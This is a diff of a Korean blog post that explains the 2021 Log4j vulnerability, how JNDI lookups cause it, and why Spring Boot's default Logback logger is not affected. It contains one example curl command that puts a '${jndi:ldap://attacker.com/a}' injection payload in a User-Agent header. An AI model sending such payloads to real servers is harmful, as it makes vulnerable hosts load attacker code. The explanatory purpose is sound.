@@ -8,6 +8,17 @@ last_modified_at: 2021-02-18 00:00:00
 ---
 
 # Log4j
+{: .no_toc }
+
+## Table of contents
+{: .no_toc .text-delta }
+
+1. TOC
+{:toc}
+
+---
+
+## 개요
 
 
 ## Log4j 보안 취약점 사태
@@ -18,7 +29,7 @@ Java 언어 기반의 프로그램중 가장 많이 사용하는 로그 라이�
 
 최초의 발단은 알리바바 클라우드 보안팀으로 부터 알려지게 되었으며, 2021년 12월 9일 트위터의 [게시글](https://twitter.com/P0rZ9/status/1468949890571337731) 로 부터 본격적으로 대중들에게 알려지게 되었다. 
 
-## 취약점 원리
+### 취약점 원리
 
 취약점 원리를 먼저 파악하기 전 JNDI(Java Naming and Directory Interface)에 대해 먼저 이해하여야 한다. JNDI는 디렉터리 서비스에서 제공하는 데이터 및 객체를 발견(discover)하고 참고(lookup)하기 위한 자바 API다.
 
@@ -34,6 +45,6 @@ curl 127.0.0.1:8080 -H 'User-Agent: ${jndi:ldap://attacker.com/a}'
 
 즉 이번 사태의 **근본적인 문제**는 log4j 에서 log 를 출력할 때, JNDI 를 lookup 하고 있었다는것이 문제다. 왜냐하면 log 를 출력할때 JNDI 를 lookup 하는 기능은 아무도 쓰지도 않는 기능이다. 스프링 부트 기본 내장 logger 인 logback 에서는 jndi lookup 자체를 하고 있지 않다. 굳이 고급 개발자가 아니더라도 해당 코드는 취약점이 발생하기 매우 높은 코드라는것은 예측이 가능한데 왜 이런 코드가 오픈 소스에 포함이 되어 있었을까 의문이다. (혹시?)
 
-## Spring boot Logback은 안전하다.
+### Spring boot Logback은 안전하다.
 
 위 취약점은 log4j에서 발생했다. 스프링 부트는 기본적으로 logback 을 사용한다. logback 은 jndi 자체를 lookup 하지 않기 때문에 ${jndi:~~} 와 같은 코드를 보내더라도 단순 문자열으로 출력할 뿐이다. 물론 스프링 부트 기본 logger를 사용하지 않고 직접 log4j 의존성을 주입하여 사용했다면 문제가 될 수 있다.
